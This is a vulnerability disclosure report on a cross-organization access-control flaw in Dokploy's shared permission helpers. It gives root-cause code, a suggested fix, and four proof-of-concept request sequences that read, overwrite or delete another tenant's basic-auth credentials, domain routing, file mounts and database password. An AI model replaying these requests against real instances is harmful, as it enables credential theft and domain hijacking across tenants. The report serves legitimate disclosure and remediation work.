repo.description:
## Summary

Dokploy is multi-tenant: any authenticated user can self-service create additional organizations via `organization.create`, and Dokploy Cloud specifically runs many unrelated paying customers on the same shared instance. The shared authorization helpers that most routers rely on for access control (`checkServicePermissionAndAccess`, `checkProjectAccess`, `checkEnvironmentAccess` in `packages/server/src/services/permission.ts`) skip their per-resource membership check entirely for `owner` and `admin` roles, and none of them verify that the resource being referenced actually belongs to the caller's currently active organization at all. For non-owner/admin members this is incidentally safe, because the membership arrays they check are only ever populated with resources from the member's own organization. For owner and admin, the default and most privileged role every organization has, nothing stops them from referencing a resource ID that belongs to a completely different, unrelated organization on the same instance.

This is the same bug class Dokploy already disclosed once as GHSA-f8wj-5c4w-frhg ("Cross-Organization IDOR: Multiple tRPC endpoints missing activeOrganizationId validation"), but that disclosure patched a specific list of individual endpoints by adding a direct, one-off organization check in each handler. It did not fix the shared helper functions themselves, so every other router built on top of them remains exposed by the same underlying mechanism. This report demonstrates the gap is still live and current, across four independent routers spanning four different resource classes, with a live reproduction on each.

## Root Cause

```js
// packages/server/src/services/permission.ts
export const checkServicePermissionAndAccess = async (ctx, serviceId, permissions) => {
  const organizationId = ctx.session.activeOrganizationId;
  const memberRecord = await findMemberByUserId(ctx.user.id, organizationId);
  await checkPermission(ctx, permissions);
  if (memberRecord.role !== "owner" && memberRecord.role !== "admin") {
    if (!memberRecord.accessedServices.includes(serviceId)) {
      throw new TRPCError({ code: "UNAUTHORIZED", message: "You don't have access to this service" });
    }
  }
  // no check at all here for owner/admin, and no check anywhere that
  // serviceId actually belongs to organizationId
};
```

`checkProjectAccess` and `checkEnvironmentAccess` follow the identical shape. Many routers resolve a resource by its own ID first (for example `findMountById`, `findSecurityById`, `findDomainById`), derive a `serviceId`/`projectId`/`environmentId` from the loaded record, and then call one of these helpers as their only gate. Since owner and admin skip the membership check unconditionally, and nothing downstream re-verifies organization ownership, an owner or admin of any organization can operate on any resource on the instance simply by knowing or guessing its ID.

The fix pattern already exists elsewhere in the same codebase, for example in `mount.ts`'s own `listByServiceId` procedure and in `postgres.ts`'s `one` and `remove` procedures:

```js
const organizationId = await getServiceOrganizationId(serviceId, serviceType);
if (organizationId === null || organizationId !== ctx.session.activeOrganizationId) {
  throw new TRPCError({ code: "UNAUTHORIZED", message: "..." });
}
```

It is simply not applied consistently. Several sibling procedures in the very same files, and across many other routers, skip it.

## Proof of Concept

All four reproductions follow the same shape: create a resource as Alice (owner) in her default organization, self-service create a brand-new, completely unrelated second organization also as Alice (`organization.create`, available to any authenticated owner/admin, no invite needed), switch the active session to the new organization via `POST /api/auth/organization/set-active`, then attempt to read and modify the first organization's resource by ID.

### 1. `security.*`, Traefik basic-auth credentials

```js
// As Alice, org A: create a basic-auth entry on an application
POST /api/trpc/security.create
{ "applicationId": "<org A app id>", "username": "basicauthuser", "password": "RealBasicAuthPass123!" }
// securityId noted from application.one: EB9l5fZp-FB5BpZN1XbL2

// Switch active org to a brand new, unrelated org B
POST /api/auth/organization/set-active { "organizationId": "<org B id>" }

// From org B, reference org A's security record by id
POST /api/trpc/security.one       {"securityId":"EB9l5fZp-FB5BpZN1XbL2"}
// 200, returns the real plaintext username and password

POST /api/trpc/security.update    {"securityId":"EB9l5fZp-FB5BpZN1XbL2","username":"HACKED-FROM-ORG-B","password":"PwnedByOrgB!"}
// 200, overwritten

POST /api/trpc/security.delete    {"securityId":"EB9l5fZp-FB5BpZN1XbL2"}
// 200, deleted
```

### 2. `domain.*`, public domain and routing configuration

```js
// Org A: create a domain on the same application
POST /api/trpc/domain.create
{ "host": "victim-secret-app.example.com", "applicationId": "<org A app id>", "domainType": "application", "https": false, "port": 3000, "certificateType": "none" }
// domainId: 6Vf4xKlt_DdPBHT-nM9mh

// From org B
POST /api/trpc/domain.one         {"domainId":"6Vf4xKlt_DdPBHT-nM9mh"}
// 200, includes nested application info from org A

POST /api/trpc/domain.update      {"domainId":"6Vf4xKlt_DdPBHT-nM9mh","host":"CONFIRMED-CROSSORG-WRITE-FROM-ORGB.evil.com", ...}
// 200, the host field is overwritten
```

`domain.update` also calls `manageDomain()` internally, which reconfigures the real Traefik router for that application. This is a live domain-hijacking primitive against another tenant's public-facing traffic, not just a database edit.

### 3. `mounts.*`, container file mounts

```js
// Org A: create a "file" type mount on the application
POST /api/trpc/mounts.create
{ "serviceId":"<org A app id>", "serviceType":"application", "type":"file", "content":"REAL_ORG_A_SECRET_CONFIG_CONTENT=abc123", "mountPath":"/app/config/secret.env", "filePath":"/app/config/secret.env" }
// mountId: LRTymww_OOGPlx9JGuwCs

// From org B
POST /api/trpc/mounts.one         {"mountId":"LRTymww_OOGPlx9JGuwCs"}
// 200, returns the real file content, and even includes
// application.environment.project.organizationId showing org A's real id
// directly in the response body, the mismatch is visible in the very
// data the API returns and still isn't checked

POST /api/trpc/mounts.update      {"mountId":"LRTymww_OOGPlx9JGuwCs","content":"HACKED_FROM_ORGB=yes", ...}
// 200, file content overwritten

POST /api/trpc/mounts.remove      {"mountId":"LRTymww_OOGPlx9JGuwCs"}
// 200, deleted
```

Note the router is registered under the key `mounts`, not `mount`, despite the source file being named `mount.ts`.

### 4. `postgres.changePassword`, live database credential takeover

```js
// Org A: create a Postgres service (left undeployed for this PoC)
POST /api/trpc/postgres.create
{ "name":"victim-db", "appName":"alice-victim-postgres", "databaseName":"victimdb", "databaseUser":"victimuser", "databasePassword":"<redacted>", "dockerImage":"postgres:15", "environmentId":"<org A environment id>" }
// postgresId: vw2zptXM1bU9bar3Dp-p6

// From org B
POST /api/trpc/postgres.changePassword {"postgresId":"vw2zptXM1bU9bar3Dp-p6","password":"<attacker's chosen password>"}
// 400 "No running container found for alice-victim-postgres-e9a1yz"
```

The 400 response is significant: it is not the `401 UNAUTHORIZED` that every other correctly-scoped endpoint returns for a genuine cross-org or non-member caller. It means the authorization check was passed completely, and the request only failed on the unrelated, later business-logic check for whether a container is currently running. `postgres.one` and `postgres.remove` in this exact same file do have the correct explicit organization check and correctly return 401 for the same cross-org attempt, confirming this is not a case of the whole file being unprotected, only this specific procedure. Had the target database actually been deployed, this call would have executed a real `docker exec <container> psql -U <user> -d postgres -c "ALTER USER ... WITH PASSWORD '<attacker's password>'"` (or the equivalent over SSH via `execAsyncRemote` if the database runs on a remote server) against another organization's live, running database, a genuine cross-tenant database takeover, not just a metadata or configuration change.

## Impact

- Full read, write, and delete of another organization's Traefik basic-auth credentials, public domain and routing configuration, and container file mount contents, purely by knowing or obtaining the resource's ID.
- Live domain hijacking: `domain.update` immediately reconfigures the real reverse proxy for the target application.
- Live database password takeover: `postgres.changePassword` would execute a real password change against another organization's running database, with no authorization boundary at all beyond the resource ID.
- In Dokploy Cloud specifically, every paying customer is `owner` of their own organization by default, and organization creation is entirely self-service. This means any customer, with no special permission, license, or role beyond what every customer already has, can do all of the above to any other customer on the platform, given only a resource ID.
- On self-hosted, single-tenant instances the exposure is limited to installs where an administrator has deliberately created multiple organizations, a real, supported, and apparently common enough scenario that Dokploy has already published one advisory about this exact bug class.
- Resource IDs are unguessable nanoid strings, so exploitation in practice requires a way to obtain a target ID (a leaked link, a shared support ticket, a previous working relationship with the target organization, log or error message disclosure elsewhere, etc.), the same caveat that applies to the class of bug generally.

## Suggested Fix

Fix this once, at the root, rather than per-endpoint. Add a mandatory organization-ownership check directly inside `checkServicePermissionAndAccess`, `checkProjectAccess`, and `checkEnvironmentAccess` themselves, for every role including `owner` and `admin`, using the same pattern already present in `mount.ts`'s `listByServiceId` and `postgres.ts`'s `one`/`remove`:

```js
const organizationId = await getServiceOrganizationId(serviceId, serviceType);
if (organizationId === null || organizationId !== ctx.session.activeOrganizationId) {
  throw new TRPCError({ code: "UNAUTHORIZED", message: "..." });
}
```

Making this check part of the shared helper itself, rather than something each new procedure has to remember to add separately, closes this specific class permanently instead of requiring another endpoint-by-endpoint sweep. Given the prior advisory covering the same root cause, it would also be worth adding an automated test asserting that every procedure using these three helpers correctly rejects a cross-organization resource id, to prevent regression as new routers are added.

## Environment

- Dokploy v0.30.3, installed via the official `install.sh` inside an isolated Docker-in-Docker sandbox, `http://localhost:3000`.
- Single test account (`alice@test.local`, global `owner` role) used to create both organizations, since `organization.create` requires no invitation and no second identity, exactly as any real attacker with an owner or admin role on their own organization could do.
- Organization switching performed via `POST /api/auth/organization/set-active`, the same endpoint the UI itself uses.
- All requests reproduced via `fetch()` in the authenticated browser session against the live tRPC API, no CSRF token required on these `POST /api/trpc/*` endpoints either.
